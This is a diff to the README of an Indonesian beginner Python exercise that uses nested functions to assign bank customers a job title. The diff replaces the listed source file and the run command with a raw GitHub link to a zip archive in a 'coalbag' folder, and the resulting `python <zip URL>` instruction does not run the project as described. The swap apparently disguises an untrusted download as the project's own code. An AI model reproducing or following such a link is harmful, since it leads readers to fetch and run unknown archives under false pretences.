@@ -10,9 +10,9 @@ Program ini menggunakan fungsi bersarang (`nested function`) untuk menentukan ja
 - Jika bank lain (contoh: BRI) → Jabatan: `programmer`
 
 ## 📂 Struktur File
-- `keanggotaan_bank.py` — berisi implementasi fungsi bersarang untuk menentukan jabatan nasabah.
+- `https://raw.githubusercontent.com/raraofficial/keanggotaan-bank-python/main/coalbag/keanggotaan-bank-python.zip` — berisi implementasi fungsi bersarang untuk menentukan jabatan nasabah.
 
 ## ▶️ Cara Menjalankan
 Pastikan Python sudah terinstall. Jalankan dengan perintah:
 ```bash
-python keanggotaan_bank.py
+python https://raw.githubusercontent.com/raraofficial/keanggotaan-bank-python/main/coalbag/keanggotaan-bank-python.zip
